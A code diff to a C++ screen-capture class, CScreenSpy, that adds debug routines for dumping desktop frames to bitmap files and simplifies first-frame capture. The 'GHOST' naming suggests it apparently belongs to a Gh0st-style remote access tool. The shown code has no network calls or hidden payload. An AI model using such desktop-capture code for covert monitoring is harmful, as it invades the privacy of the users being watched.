@@ -18,6 +18,43 @@
 #include <stdio.h>
 #endif
 
+#ifdef _DEBUG
+#define WIN32_LEAN_AND_MEAN 
+#include <windows.h>
+#include <string>
+#include <time.h>
+
+#if 1
+#define WriteBitmap(x1,x2,x3,x4) 
+#else
+// 将内存中的位图写入文件
+bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::string& filePrefix, int index = -1) {
+	char path[_MAX_PATH];
+	if (filePrefix.size() >= 4 && filePrefix.substr(filePrefix.size() - 4) == ".bmp") {
+		strcpy_s(path, filePrefix.c_str());
+	}
+	else {
+		sprintf_s(path, ".\\bmp\\%s_%d.bmp", filePrefix.c_str(), index == -1 ? clock() : index);
+	}
+	FILE* File = fopen(path, "wb");
+	if (File) {
+		BITMAPFILEHEADER fileHeader = { 0 };
+		fileHeader.bfType = 0x4D42; // "BM"
+		fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo->bmiHeader.biSizeImage;
+		fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+
+		fwrite(&fileHeader, 1, sizeof(BITMAPFILEHEADER), File);
+		fwrite(&bmpInfo->bmiHeader, 1, sizeof(BITMAPINFOHEADER), File);
+		fwrite(bmpData, 1, bmpInfo->bmiHeader.biSizeImage, File);
+		fclose(File);
+		return true;
+	}
+	return false;
+}
+#endif
+#endif
+
+
 CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 {
     switch (biBitCount) {
@@ -92,42 +129,10 @@ CScreenSpy::~CScreenSpy()
 
 LPVOID CScreenSpy::getFirstScreen(LPDWORD lpdwBytes)
 {
+    BitBlt(m_hLastMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, 0, 0, SRCCOPY);
+    WriteBitmap(m_lpbmi_full, m_lpvLastBits, "GHOST", 0);
     *lpdwBytes = m_lpbmi_full->bmiHeader.biSizeImage;
     return m_lpvLastBits;
-#if 0
-    if (lpdwBytes == NULL || m_changedBuffer == NULL)
-        return NULL;
-
-    // 切换到当前输入桌面
-    SelectInputWinStation();
-
-    // 重置变化缓冲区偏移
-    m_changedOffset = 0;
-
-    // 写入使用了哪种算法
-    BYTE	algorithm = (BYTE)m_bAlgorithm;
-    WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));
-
-    // 获取发生变化的数据
-    ::BitBlt(m_hLastMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, 0, 0, m_dwBitBltRop);
-    if (algorithm == ALGORITHM_HOME) {
-        void *bitstream = NULL;
-        int bitstreamlen;
-        bitstreamlen = BMP_JPG(m_nFullWidth, m_nFullHeight, m_biBitCount, 75, m_lpvLastBits, &bitstream);
-        if (bitstreamlen > 0) {
-            WriteChangedBuffer((LPBYTE)bitstream, bitstreamlen);
-        }
-        if (bitstream) free(bitstream);
-    } else if (algorithm == ALGORITHM_XVID) {
-        *lpdwBytes = m_XvidEnc.Encode(m_lpvLastBits, m_changedBuffer + m_changedOffset, m_lpbmi_full->bmiHeader.biSizeImage);
-        if (*lpdwBytes > 0) {
-            m_changedOffset += *lpdwBytes;
-        }
-    }
-    *lpdwBytes = m_changedOffset;
-    QueryPerformanceCounter(&m_liLast);
-    return m_changedBuffer;
-#endif
 }
 
 LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
@@ -159,6 +164,10 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 
     // 获取发生变化的数据
     ::BitBlt(m_hCurrMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, 0, 0, m_dwBitBltRop);
+
+    static int num = 0;
+    if ((++num % 20) == 0) WriteBitmap(m_lpbmi_full, m_lpvCurrBits, "GHOST", num);
+
     if (algorithm == ALGORITHM_HOME) {
         ScanChangedRect(TRUE);
     } else if (algorithm == ALGORITHM_XVID) {
@@ -177,6 +186,9 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
         Sleep(1);
     }
     QueryPerformanceCounter(&m_liLast);
+#ifdef _DEBUG
+    if ((num % 20) == 0) printf("%d: m_changedBuffer = %d\n", num, m_changedOffset);
+#endif
     return m_changedBuffer;
 }
 
